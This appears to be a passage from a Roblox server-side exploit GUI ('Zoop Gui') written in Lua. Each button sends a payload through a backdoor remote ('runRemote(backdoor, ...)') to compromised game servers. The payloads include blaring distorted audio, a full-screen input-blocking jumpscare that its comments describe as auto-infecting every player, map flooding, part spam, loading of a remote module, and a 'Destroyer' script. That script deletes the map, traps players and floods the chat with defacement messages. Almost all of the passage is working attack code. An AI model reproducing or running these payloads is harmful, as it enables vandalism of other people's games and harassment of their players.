+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", y) 
+fx.Level = 0.5
+y:Play()
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton(' music jumpstyle 0ld', function() 
+local codeText = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://1839246711"
+y.Pitch = 1
+y.Looped = true
+y.Volume = 10
+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", y) 
+fx.Level = 0.3
+y:Play()
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton('music jumpstyle', function() 
+local codeText = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://76578817848504"
+y.Pitch = 1
+y.Looped = true
+y.Volume = 10
+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", s) 
+fx.Level = 1
+y:Play()
+]]
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton('idk ', function() 
+local codeText = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://73002098096282"
+y.Pitch = 0.1
+y.Looped = true
+y.Volume = 10
+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", s) 
+fx.Level = 1
+y:Play()
+]]
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton("thomas the dank engine Sound", function()
+local sountd = [[
+local train = game.Workspace
+local sound   = Instance.new("Sound")
+sound.SoundId = "http://www.roblox.com/asset/?id=79788632076386" --Change the last numbers of the link to the id of your audio.
+sound.Parent  = train
+sound.Volume  = 10
+sound.PlaybackSpeed = 0.25
+
+local sound2   = Instance.new("Sound")
+sound2.SoundId = "http://www.roblox.com/asset/?id=107660749733264" --Change the last numbers of the link to the id of your audio.
+sound2.Parent  = train
+sound2.Volume  = 10
+sound2.PlaybackSpeed = 0.25
+
+local sound3   = Instance.new("Sound")
+sound3.SoundId = "http://www.roblox.com/asset/?id=98802358376046" --Change the last numbers of the link to the id of your audio.
+sound3.Parent  = train
+sound3.Volume  = 10
+sound3.PlaybackSpeed = 0.25
+
+local sound4   = Instance.new("Sound")
+sound4.SoundId = "http://www.roblox.com/asset/?id=89302871319708" --Change the last numbers of the link to the id of your audio.
+sound4.Parent  = train
+sound4.Volume  = 10
+sound4.PlaybackSpeed = 0.25
+
+local sound5   = Instance.new("Sound")
+sound5.SoundId = "http://www.roblox.com/asset/?id=130995785939526" --Change the last numbers of the link to the id of your audio.
+sound5.Parent  = train
+sound5.Volume  = 10
+sound5.PlaybackSpeed = 0.25
+
+local sounds = {sound, sound2, sound3, sound4, sound5}
+
+for _, s in ipairs(sounds) do
+	local d = Instance.new("DistortionSoundEffect")
+	d.Level = 0.95
+	d.Parent = s
+
+	local e = Instance.new("EqualizerSoundEffect")
+	e.HighGain = -100
+	e.LowGain = 10
+	e.MidGain = -5
+	e.Priority = 0
+	e.Parent = s
+end
+
+sound.Ended:Connect(function()
+	sound2:Play()
+end)
+sound2.Ended:Connect(function()
+	sound3:Play()
+end)
+sound3.Ended:Connect(function()
+	sound4:Play()
+end)
+sound4.Ended:Connect(function()
+	sound5:Play()
+end)
+sound5.Ended:Connect(function()
+	sound:Play()
+end)
+
+sound:Play()
+]]
+runRemote(backdoor, sountd) 
+end) 
+createFunctionButton('delete music', function() 
+local codeText = [[
+for _, s in ipairs(workspace:GetDescendants()) do
+	if s:IsA("Sound") then
+		pcall(function()
+			if s and s.Parent then
+				s:Stop()
+				task.wait(0.01)
+				s.Parent = nil
+				task.wait(0.01)			
+				s:Destroy()
+			end
+		end)
+	end
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton("Zoop Gui v1", function()
+local codeText = 'require(99828653173391).Zoop( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton('anime girl sky', function()
+local codeText = [[
+local function ExecuteScare(player)
+    local playerGui = player:WaitForChild("PlayerGui")
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "FinalScareEffect"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 9999
+    gui.Parent = player.PlayerGui
+    -- Container Utama (Biar putih + gambar ilang barengan)
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.fromScale(1, 1)
+    mainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = gui
+    local blocker = Instance.new("TextButton")
+    blocker.Size = UDim2.fromScale(1, 1)
+    blocker.BackgroundTransparency = 1
+    blocker.Text = ""
+    blocker.Modal = true
+    blocker.Parent = mainFrame
+    local image = Instance.new("ImageLabel")
+    image.AnchorPoint = Vector2.new(0.5, 0.5)
+    image.Position = UDim2.fromScale(0.5, 0.5)
+    image.Size = UDim2.fromScale(1, 1)
+    image.BackgroundTransparency = 1
+    image.Image = "rbxassetid://84838094344701"
+    image.Parent = mainFrame
+    -- Audio
+    local sound1 = Instance.new("Sound", gui)
+    sound1.SoundId = "rbxassetid://82719020266339"
+    sound1.Volume = 2 -- Naikin dikit biar kaget
+    local sound2 = Instance.new("Sound", workspace)
+    sound2.SoundId = "rbxassetid://134884767490882"
+    sound2.Volume = 0.8
+    sound2.Looped = true
+    local dist = Instance.new("DistortionSoundEffect", sound2)
+    dist.Level = 0.7
+    -- Animasi & Transisi
+    task.delay(2.8, function()
+        if image then image.Image = "rbxassetid://95558068230459" end
+    end)
+    task.spawn(function()
+        local t = 0
+        while mainFrame.Parent do
+            local dt = task.wait()
+            t = t + dt * 6
+            image.Position = UDim2.fromScale(0.5 + (math.sin(t * 7) * 0.02), 0.5 + (math.cos(t * 8) * 0.02))
+            image.Size = UDim2.fromScale(1 + math.sin(t * 8) * 0.15, 1 + math.sin(t * 8) * 0.15)
+            image.Rotation = math.sin(t * 10) * 10
+        end
+    end)
+    sound1.Ended:Connect(function()
+        mainFrame:Destroy() -- Visual putih & gambar lenyap TOTAL
+        sound2:Play()
+    end)
+    sound1:Play()
+end
+-- LOGIKA SKYBOX (Global & Looping)
+local function StartSkybox()
+    local Lighting = game:GetService("Lighting")
+    local oldSky = Lighting:FindFirstChildOfClass("Sky")
+    if oldSky then oldSky:Destroy() end
+    local sky = Instance.new("Sky", Lighting)
+    local frames = {21076888, 21076945, 21077007, 21077125, 21077227, 21077345}
+    task.spawn(function()
+        while true do
+            for _, id in ipairs(frames) do
+                local asset = "rbxassetid://" .. id
+                sky.SkyboxBk = asset
+                sky.SkyboxDn = asset
+                sky.SkyboxFt = asset
+                sky.SkyboxLf = asset
+                sky.SkyboxRt = asset
+                sky.SkyboxUp = asset
+                task.wait(0.1)
+            end
+        end
+    end)
+end
+-- EKSEKUSI UTAMA
+local Players = game:GetService("Players")
+-- Jalankan Skybox Sekali
+StartSkybox()
+-- Jalankan Jumpscare
+if Players.LocalPlayer then
+    ExecuteScare(Players.LocalPlayer)
+else
+    -- Mode Backdoor: Kena Semua Orang
+    for _, p in pairs(Players:GetPlayers()) do
+        task.spawn(ExecuteScare, p)
+    end
+    -- Pemain baru masuk juga kena (Auto-infect)
+    Players.PlayerAdded:Connect(function(p)
+        task.wait(1)
+        ExecuteScare(p)
+    end)
+end
+
+]]
+KK.Text = codeText
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton('Flood', function() 
+local codeText = [[
+workspace.Terrain:FillBlock(
+    CFrame.new(0, 50, 0),
+    Vector3.new(5000, 100, 5000),
+    Enum.Material.Water
+)
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton('part raining', function() 
+local codeText = [[
+local RunService = game:GetService("RunService")
+local Materials = Enum.Material:GetEnumItems()
+local Shapes = {
+	Enum.PartType.Block,
+	Enum.PartType.Ball,
+	Enum.PartType.Cylinder
+}
+
+-- Area hujan
+local Xrange = math.random(-255,9999)   -- lebar hujan
+local Zrange = math.random(-255,9999)   -- panjang hujan
+local height = math.random(-255,9999)   -- tinggi spawn part
+
+-- Waktu jeda setiap spawn
+local spawnDelay = 0.02
+
+while true do
+	task.wait(spawnDelay)
+
+	-- buat part
+	local p = Instance.new("Part")
+	p.Anchored = false
+	p.CanCollide = true
+
+	-- ukuran random (10–50)
+	local size = math.random(10, 90)
+	p.Size = Vector3.new(size, size, size)
+
+	-- posisi random di atas
+	local X = math.random(-Xrange, Xrange)
+	local Z = math.random(-Zrange, Zrange)
+	p.Position = Vector3.new(X, height, Z)
+
+	-- shape random
+	p.Shape = Shapes[math.random(1, #Shapes)]
+
+	-- warna random
+	p.Color = Color3.fromRGB(
+		math.random(0,255),
+		math.random(0,255),
+		math.random(0,255)
+	)
+
+	-- material random
+	p.Material = Materials[math.random(1, #Materials)]
+
+	p.Parent = workspace
+
+	-- auto-destroy setelah jatuh
+	task.delay(15, function()
+		if p then p:Destroy() end
+	end)
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton("Destroyer", function()
+local codeText = [[
+
+local ID = 80970671139625
+local SOUND_ID = "rbxassetid://128802844460270"
+local ChatService = game:GetService("Chat")
+
+local TEXT_SEQUENCES = {
+	"ZOOPGUI0 WAS HEREE",
+	"ZOOPGUI0 FUCK THE GAME!!!!",
+	"RECORD PLS 🙏🏻🙏🏻🙏🏻 @ZOOPGUI0"
+}
+
+local GLITCH_CHARS = {"!","@","#","$","%","^","&","*","?","/",">","<","|","§","Δ","Ξ"}
+
+local s = Instance.new("Sound", game:GetService("SoundService"))
+s.SoundId = SOUND_ID
+s.Volume = 9999
+s.PlaybackSpeed = 0.2
+s.Looped = true
+s.Parent = game:GetService("SoundService")
+s:Play()
+
+task.wait(1.4)
+
+for _, obj in pairs(workspace:GetChildren()) do
+	if not obj:IsA("Camera") and not obj:IsA("Terrain") and not game.Players:GetPlayerFromCharacter(obj) then
+		obj:Destroy()
+	end
+end
+
+local mapBaru = Instance.new("Part")
+mapBaru.Name = "InsaneBaseplate"
+mapBaru.Size = Vector3.new(600, 2, 600)
+mapBaru.Position = Vector3.new(0, 10, 0)
+mapBaru.Anchored = true
+mapBaru.CanCollide = true
+mapBaru.BrickColor = BrickColor.new("Really black")
+mapBaru.Parent = workspace
+
+for _, face in ipairs({"Front","Top","Left","Right","Bottom","Back"}) do
+	local d = Instance.new("Decal", mapBaru)
+	d.Texture = "rbxassetid://"..ID
+	d.Face = Enum.NormalId[face]
+end
+
+for i = 1, 4 do
+	local wall = Instance.new("Part", workspace)
+	wall.Size = Vector3.new(600, 1000, 2)
+	wall.Transparency = 1
+	wall.Anchored = true
+	wall.CanCollide = true
+	if i == 1 then wall.Position = Vector3.new(0, 500, 300)
+	elseif i == 2 then wall.Position = Vector3.new(0, 500, -300)
+	elseif i == 3 then wall.Size = Vector3.new(2, 1000, 600) wall.Position = Vector3.new(300, 500, 0)
+	elseif i == 4 then wall.Size = Vector3.new(2, 1000, 600) wall.Position = Vector3.new(-300, 500, 0) end
+end
+
+task.spawn(function()
+	local rotY = 0
+	while true do
+		rotY = rotY + 90
+		mapBaru.CFrame = CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(rotY), 0)
+		task.wait(0.1)
+		rotY = rotY + 90
+		mapBaru.CFrame = CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(rotY), math.rad(45))
+		task.wait(0.1)
+		rotY = rotY + 90
+		mapBaru.CFrame = CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(rotY), math.rad(-45))
+		task.wait(0.1)
+	end
+end)
+
+local function applyChaos(p)
+	p.CharacterAdded:Connect(function(char)
+		local gui = Instance.new("ScreenGui", p:WaitForChild("PlayerGui"))
+		local img = Instance.new("ImageLabel", gui)
+		img.Size = UDim2.new(1, 0, 1, 0)
+		img.Image = "rbxassetid://"..ID
+		img.BackgroundTransparency = 1
+		task.delay(2, function() gui:Destroy() end)
+
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		task.wait(0.1)
+		hrp.CFrame = CFrame.new(0, 35, 0)
+		for _, v in pairs(char:GetChildren()) do
+			if v:IsA("BasePart") then
+				local pe = Instance.new("ParticleEmitter", v)
+				pe.Texture = "rbxassetid://"..ID
+				pe.Rate = 200
+				pe.Size = NumberSequence.new(5)
+			end
+		end
+	end)
+end
+
+for _, p in pairs(game.Players:GetPlayers()) do applyChaos(p) end
+game.Players.PlayerAdded:Connect(applyChaos)
+
+task.spawn(function()
+	while true do
+		for _, p in pairs(game.Players:GetPlayers()) do
+			if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+				if p.Character.HumanoidRootPart.Position.Y < -5 then
+					p.Character.HumanoidRootPart.CFrame = CFrame.new(0, 35, 0)
+					p.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+				end
+				local char = p.Character
+				if char:FindFirstChild("Humanoid") then
+					char.Humanoid.CameraOffset = Vector3.new(math.random(-2,2), math.random(-2,2), math.random(-2,2))
+				end
+			end
+		end
+		task.wait(0.01)
+	end
+end)
+
+local lighting = game:GetService("Lighting")
+lighting.ClockTime = 14
+lighting.Brightness = 15
+local cc = Instance.new("ColorCorrectionEffect", lighting)
+cc.Saturation = -1000
+
+local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", lighting)
+sky.SkyboxBk = "rbxassetid://"..ID sky.SkyboxDn = "rbxassetid://"..ID sky.SkyboxFt = "rbxassetid://"..ID
+sky.SkyboxLf = "rbxassetid://"..ID sky.SkyboxRt = "rbxassetid://"..ID sky.SkyboxUp = "rbxassetid://"..ID
+
+task.spawn(function()
+	while true do
+		lighting.ClockTime = math.random(0, 24)
+		task.wait(0.03)
+	end
+end)
+
+task.spawn(function()
+	local m = Instance.new("Message", workspace)
+	while true do
+		for _, teks in ipairs(TEXT_SEQUENCES) do
+			for i = 1, 8 do
+				local glitch = ""
+				for j = 1, #teks do glitch = glitch .. GLITCH_CHARS[math.random(1, #GLITCH_CHARS)] end
+				m.Text = glitch
+				task.wait(0.05)
+			end
+			m.Text = teks
+			task.wait(1.5)
+		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if player.Character and player.Character:FindFirstChild("Head") then
+				ChatService:Chat(player.Character.Head, "ZOOPGUI0 HACK THE GAME", Enum.ChatColor.Red)
+			end
+		end
+		task.wait(0.2)
+	end
+end)
+]]
+runRemote(backdoor, codeText) 
+end) 
+
+return LMG2L["anjingyes_1"], require;
